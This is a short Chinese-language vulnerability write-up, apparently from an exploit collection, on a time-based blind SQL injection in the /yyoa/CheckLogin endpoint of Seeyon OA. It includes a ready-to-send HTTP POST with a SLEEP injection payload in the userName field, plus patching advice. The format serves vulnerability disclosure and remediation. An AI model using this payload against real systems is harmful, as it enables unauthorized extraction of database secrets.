---
source: "OA-EXPTOOL/Lucifer1993"
---

# 致远OA yyoa CheckLogin SQL注入漏洞

## 漏洞描述

致远OA `/yyoa/CheckLogin` 登录接口存在 SQL 注入漏洞。`userName` 参数拼接时间盲注语句即可判断注入并逐字提取数据库敏感信息。

注：`/yyoa/` 为致远OA 上下文路径（I-Wanna-Get-All 将该路径下利用模块归类于 `exp/oa/seeyonoa/yyoa/`），故归入致远OA；来源工具曾误标为用友产品，特此更正。

## 漏洞影响

```
致远OA
```

## 漏洞复现

```http
POST /yyoa/CheckLogin HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

userName=11' AND (SELECT 6355 FROM (SELECT(SLEEP(0)))sHcE) AND 'wert'='wert&password=11
```

通过 `userName` 参数中的时间盲注语句（SLEEP）判断注入是否成功，进而可逐字提取数据库敏感信息。

> 仅限授权测试。

## 漏洞修复

联系厂商获取安全补丁，对 `userName` 等登录参数使用预编译语句并做严格过滤。
